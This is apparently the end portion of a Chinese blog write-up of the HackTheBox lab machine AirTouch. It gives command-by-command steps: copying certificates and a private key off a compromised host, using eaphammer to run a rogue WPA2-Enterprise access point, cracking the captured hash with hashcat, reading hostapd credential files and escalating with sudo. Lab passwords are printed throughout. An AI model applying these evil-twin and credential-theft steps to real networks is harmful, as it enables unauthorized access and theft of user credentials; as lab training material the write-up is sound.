+<p>该脚本用于将证书等同步到远程服务器，这个服务器应该是AirTouch-Office的AP。</p>
+<p>并且发现了一组凭据<code>remote:xGgWEwqUpfoOVsLeROeG</code>。</p>
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772210563504.png" alt="1772210563504"></p>
+<p>将目标机器上的ca.crt、server.crt、server.key下载到第一台机器。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scp user@192.168.3.1:/home/user/certs-backup/ca.crt .</span><br><span class="line">scp user@192.168.3.1:/home/user/certs-backup/server.crt .</span><br><span class="line">scp user@192.168.3.1:/home/user/certs-backup/server.key .</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772210639639.png" alt="1772210639639"></p>
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772210896768.png" alt="1772210896768"></p>
+<p>再次扫描网络，在44信道，看到了AirTouch-Office网络。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng --channel 44 wlan0mon</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772211407802.png" alt="1772211407802"></p>
+<p>导入上面的证书和私钥，用于伪造AirTouch-Office的RADIUS认证服务器。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./eaphammer --cert-wizard import --server-cert server.crt --ca-cert ca.crt --private-key server.key</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772210967764.png" alt="1772210967764"></p>
+<p>之后创建虚假的AirTouch-Office网络，等待用户进行连接，等待一会儿接收到连接凭据。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./eaphammer --creds -i wlan0mon -e &quot;AirTouch-Office&quot; -b AC:8B:A9:AA:3F:D2 -c 44 --auth wpa-eap</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772211791097.png" alt="1772211791097"></p>
+<p>使用Hashcat爆破密码为<code>laboratory</code>。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 5500 hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772211909937.png" alt="1772211909937"></p>
+<p>创建连接配置文件，并且连接AirTouch-Office网络。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ctrl_interface=/var/run/wpa_supplicant</span><br><span class="line">ap_scan=1</span><br><span class="line">network=&#123;</span><br><span class="line">    ssid=&quot;AirTouch-Office&quot;</span><br><span class="line">    scan_ssid=1</span><br><span class="line">    key_mgmt=WPA-EAP</span><br><span class="line">    eap=PEAP</span><br><span class="line">    identity=&quot;AirTouch\r4ulcl&quot;           </span><br><span class="line">    password=&quot;laboratory&quot;</span><br><span class="line">    phase1=&quot;peapver=0&quot;</span><br><span class="line">    phase2=&quot;auth=MSCHAPV2&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpa_supplicant -Dnl80211 -i wlan2 -c AirTouch-Office.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772212098597.png" alt="1772212098597"></p>
+<p>之后查看wlan2无线网卡，发现已经连接成功。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwconfig wlan2</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772212143452.png" alt="1772212143452"></p>
+<p>让AP使用DHCP协议分配IP地址给当前机器。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dhclient wlan2</span><br><span class="line">ifconfig wlan2</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772212211340.png" alt="1772212211340"></p>
+<h3 id="3-2-Hostapd凭证泄露"><a href="#3-2-Hostapd凭证泄露" class="headerlink" title="3.2 Hostapd凭证泄露"></a>3.2 Hostapd凭证泄露</h3><p>使用上面泄露凭证<code>remote:xGgWEwqUpfoOVsLeROeG</code>进行远程连接。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh remote@10.10.10.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772212264033.png" alt="1772212264033"></p>
+<p>查看&#x2F;etc&#x2F;passwd文件，还有一个用户为admin。</p>
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772212584957.png" alt="1772212584957"></p>
+<p>直接查看AP中的hostapd_wpe.eap_user配置文件，发现两组密码。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/hostapd/hostapd_wpe.eap_user</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772212559125.png" alt="1772212559125"></p>
+<p>使用密码<code>xMJpzXt4D9ouMuL3JJsMriF7KZozm7</code>进行认证，认证成功，并且sudo提权成功。</p>
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772212640133.png" alt="1772212640133"></p>
+<h2 id="4-总结思考"><a href="#4-总结思考" class="headerlink" title="4. 总结思考"></a>4. 总结思考</h2><h3 id="4-1-SNMP凭证泄露"><a href="#4-1-SNMP凭证泄露" class="headerlink" title="4.1 SNMP凭证泄露"></a>4.1 SNMP凭证泄露</h3><p>SNMP是一种管理网络设备的协议，通常运行于161&#x2F;UDP端口，用于读取设备状态信息。</p>
+<p>在SNMP v1&#x2F;v2c中，认证机制非常简单，依赖于社区字符串。</p>
+<p>常见的默认值有：很多设备出厂默认是<code>public</code>。</p>
+<ul>
+<li><code>public</code>：只读。</li>
+<li><code>private</code>：读写。</li>
+</ul>
+<p>SNMP泄露的本质即是弱认证机制和明文传输。</p>
+<hr>
+<p>……未完待续</p>
+<h3 id="4-2-WPA2-PSK-Cracking"><a href="#4-2-WPA2-PSK-Cracking" class="headerlink" title="4.2 WPA2-PSK Cracking"></a>4.2 WPA2-PSK Cracking</h3><h3 id="4-3-WPA2-Enterprise"><a href="#4-3-WPA2-Enterprise" class="headerlink" title="4.3 WPA2-Enterprise"></a>4.3 WPA2-Enterprise</h3>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Initial-Access"><span class="toc-number">1.</span> <span class="toc-text">1. Initial Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-SNMP%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 SNMP凭证泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-AirTouch-Internet"><span class="toc-number">2.</span> <span class="toc-text">2. AirTouch-Internet</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-WPA2-PSK-Cracking"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 WPA2-PSK Cracking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-SSH%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 SSH本地端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E6%B5%81%E9%87%8F%E5%8C%85%E6%B3%84%E9%9C%B2Cookie"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 流量包泄露Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87RCE"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 文件上传绕过RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-PHP%E8%84%9A%E6%9C%AC%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 PHP脚本凭证泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-AirTouch-Office"><span class="toc-number">3.</span> <span class="toc-text">3. AirTouch-Office</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-WPA2-Enterprise"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 WPA2-Enterprise</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Hostapd%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 Hostapd凭证泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%80%BB%E7%BB%93%E6%80%9D%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">4. 总结思考</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-SNMP%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 SNMP凭证泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-WPA2-PSK-Cracking"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 WPA2-PSK Cracking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-WPA2-Enterprise"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 WPA2-Enterprise</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/&text=HackTheBox Machine AirTouch"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/&title=HackTheBox Machine AirTouch"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/&is_video=false&description=HackTheBox Machine AirTouch"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox Machine AirTouch&body=Check out this article: http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/&title=HackTheBox Machine AirTouch"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/&title=HackTheBox Machine AirTouch"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/&title=HackTheBox Machine AirTouch"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/&title=HackTheBox Machine AirTouch"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/&name=HackTheBox Machine AirTouch&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/&t=HackTheBox Machine AirTouch"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
